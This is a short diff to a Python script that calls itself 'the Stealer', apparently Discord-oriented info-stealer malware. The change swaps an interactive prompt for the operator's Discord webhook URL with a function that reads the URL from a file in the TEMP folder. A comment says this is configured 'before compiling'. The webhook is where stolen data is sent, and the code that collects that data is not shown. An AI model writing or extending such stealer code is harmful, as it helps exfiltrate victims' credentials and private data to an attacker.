@@ -28,9 +28,27 @@ from shutil import copyfile
 from sys import argv
 
 # open a cmd window and ask form url
-os.system('cls' if os.name == 'nt' else 'clear')
-print("Welcome to the Stealer, please paste your Discord Webhook URL below:")
-url = input("Discord Webhook URL: ")
+
+def get_webhook():
+    temp_path = os.getenv('TEMP')  # Get the TEMP folder path
+    webhook_file = os.path.join(temp_path, 'webhook.txt')
+
+    try:
+        with open(webhook_file, 'r') as f:
+            webhook_url = f.read().strip()
+            return webhook_url
+    except FileNotFoundError:
+        print("Webhook file not found!")
+        return None
+
+webhook = get_webhook()
+if webhook:
+    print(f"Using webhook: {webhook}")
+    # Your code to send data to webhook here
+else:
+    # Handle error (maybe exit or fallback)
+    pass
+url = webhook
 
 # CONFIG -> Setup before compiling
 #url= "" #Paste Discord Webhook url
